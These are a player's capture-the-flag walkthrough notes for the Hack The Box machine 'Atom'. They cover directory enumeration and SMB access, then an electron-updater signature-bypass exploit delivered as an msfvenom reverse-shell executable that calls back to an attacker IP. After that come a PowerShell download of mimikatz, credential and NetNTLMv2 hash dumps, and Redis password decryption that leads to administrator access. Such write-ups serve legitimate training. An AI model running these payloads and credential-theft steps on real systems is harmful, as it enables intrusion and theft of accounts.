
HTB IP: 10.10.10.237

# Enumeration

gobuster directory enum:
```
/images               (Status: 301) [Size: 332] [--> https://atom.htb/images/]
/Images               (Status: 301) [Size: 332] [--> https://atom.htb/Images/]
/releases             (Status: 301) [Size: 334] [--> https://atom.htb/releases/]
/examples             (Status: 503) [Size: 399]
/licenses             (Status: 403) [Size: 418]
/IMAGES               (Status: 301) [Size: 332] [--> https://atom.htb/IMAGES/]
/%20                  (Status: 403) [Size: 299]
/Releases             (Status: 301) [Size: 334] [--> https://atom.htb/Releases/]
/*checkout*           (Status: 403) [Size: 299]
/phpmyadmin           (Status: 403) [Size: 299]
/webalizer            (Status: 403) [Size: 299]
/*docroot*            (Status: 403) [Size: 299]
/*                    (Status: 403) [Size: 299]
/con                  (Status: 403) [Size: 299]
/http%3A              (Status: 403) [Size: 299]
/**http%3a            (Status: 403) [Size: 299]
/*http%3A             (Status: 403) [Size: 299]
/aux                  (Status: 403) [Size: 299]
/**http%3A            (Status: 403) [Size: 299]
/%C0                  (Status: 403) [Size: 299]
```

- Found and downloaded a zip file for window version

SMB client

```
smbclient \\\10.10.10.237\\Software_Updates
smb> get UAT_Software...pdf
```


Exploit: https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html
Exe payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=4445 -f exe > v’ulnerable-app-setup-1.2.3.exe
```

```
latest.yml

```

# Post Exploitation

User creds:
```
 Username:              ATOM\jason
     Password:               kidvscat_electron_@123
     Target:                ATOM\jason
     PersistenceType:       Enterprise
     LastWriteTime:         3/31/2021 2:53:49 AM
```

NLTM Hashes:
```
  [+] Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    jason::ATOM:1122334455667788:62600b71c1e1421373ce5cc25bddedfa:0101000000000000d89c52205238d701261ff06235107301000000000800300030000000000000000000000000200000247f041ae8b9b47de738a56da142b9edb51b7b3a31dbe348333b7da65357516a0a00100000000000000000000000000000000000090000000000000000000000
```
Possible DLL Hijacking folder:

```
 C:\Users\jason\appdata\Local\programs\heedv1

 [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (ATOM\Administrator) SoftwareUpdates: C:\Users\jason\appdata\roaming\cache\run.bat
    Permissions file: jason [WriteData/CreateFiles AllAccess]
    Permissions folder(DLL Hijacking): jason [WriteData/CreateFiles AllAccess]
    Trigger: At log on of ATOM\jason

   =================================================================================================

    (ATOM\Administrator) UpdateServer: C:\Users\jason\appdata\roaming\cache\http-server.bat
    Permissions file: jason [WriteData/CreateFiles AllAccess]
    Permissions folder(DLL Hijacking): jason [WriteData/CreateFiles AllAccess]
    Trigger: At log on of ATOM\jason
```

python exe:
```
C:\Users\jason\AppData\Local\Microsoft\WindowsApps\python3.exe
```

Download file to Window machine:
`(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.22:8000/mimikatz.exe", "C:\Users\jason\mimikatz.exe")` 

Decrypt password from kanban: https://www.exploit-db.com/exploits/49409

Credentials file:
```
C:\Users\jason\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D


  "RoamingSettings": {
    "DataSource": "RedisServer",
    "DbServer": "localhost",
    "DbPort": 6379,
    "DbEncPassword": "Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb",
    "DbServer2": "",
    "DbPort2": 6379,
    "DbEncPassword2": "",
```
redis password: kidvscat_yes_kidvscat

ADmin creds from password:
```
 .\redis-cli.exe -h localhost -p 6379 -n 0 -a "kidvscat_yes_kidvscat" get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi","Role":"Admin","Inactive":false,"TimeStamp":637530169606440253}
```

After decode secret key: `kidvscat_admin_@123`
